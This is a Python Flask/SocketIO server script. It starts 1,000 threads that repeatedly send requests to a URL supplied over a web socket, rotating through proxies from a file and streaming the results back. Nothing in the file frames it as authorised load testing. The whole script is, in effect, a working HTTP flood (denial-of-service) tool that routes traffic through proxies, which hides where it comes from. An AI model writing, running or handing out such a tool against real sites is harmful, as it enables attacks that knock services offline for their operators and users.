from flask import Flask, request
from flask_socketio import SocketIO, emit
import threading
import requests
import time

app = Flask(__name__)
socketio = SocketIO(app, cors_allowed_origins="*")
running = False
threads = []
NUM_THREADS = 1000

def send_requests(url, proxies, sid):
    while running:
        for proxy in proxies:
            if not running:
                break
            try:
                r = requests.get(url, proxies={"http": proxy, "https": proxy}, timeout=3)
                socketio.emit('result', {'status': 'success', 'proxy': proxy, 'code': r.status_code}, room=sid)
            except Exception as e:
                socketio.emit('result', {'status': 'fail', 'proxy': proxy, 'error': str(e)}, room=sid)

@socketio.on('start')
def handle_start(data):
    global running, threads
    if running:
        emit('info', {'msg': 'Already running'})
        return
    url = data.get('url')
    with open('proxies.txt') as f:
        proxies = [line.strip() for line in f if line.strip()]
    running = True
    threads = []
    sid = request.sid
    for _ in range(NUM_THREADS):
        t = threading.Thread(target=send_requests, args=(url, proxies, sid))
        t.daemon = True
        t.start()
        threads.append(t)
    emit('info', {'msg': f'Started {NUM_THREADS} threads'})

@socketio.on('stop')
def handle_stop():
    global running
    running = False
    emit('info', {'msg': 'Stopped'})

if __name__ == '__main__':
    socketio.run(app, host='0.0.0.0', port=5000)
